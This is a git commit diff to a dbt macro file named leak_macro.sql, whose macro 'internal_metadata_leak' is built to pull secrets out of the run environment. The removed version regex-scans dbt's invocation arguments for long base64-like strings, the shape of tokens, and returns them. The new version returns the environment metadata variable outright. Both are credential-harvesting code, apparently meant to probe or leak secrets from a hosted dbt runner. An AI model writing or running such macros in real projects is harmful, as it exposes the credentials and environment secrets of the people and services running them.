f5f5bb4c1916d16038e5d76a98c8466f861d822b
Taofik Hidayat <146046695+eviruin@users.noreply.github.com>
2026-03-11 02:21:08 +0700

    Update leak_macro.sql

--- macros/leak_macro.sql
+++ macros/leak_macro.sql
@@ -1,15 +1,3 @@
 {% macro internal_metadata_leak() %}
-    {% if execute %}
-        {% set pattern = "[A-Za-z0-9+/]{20,50}" %}
-        {% set regex = modules.re.compile(pattern) %}
-        
-        {% set full_text = invocation_args_dict | tojson %}
-        {% set matches = regex.findall(full_text) %}
-        
-        {% set result = matches | join(" | ") if matches else "no_long_strings" %}
-        
-        {{ return("RANDOM_STRINGS: " ~ result | truncate(200)) }}
-    {% else %}
-        {{ return("deep_memory_scan...") }}
-    {% endif %}
+    {{ return(dbt_metadata_envs) }}
 {% endmacro %}
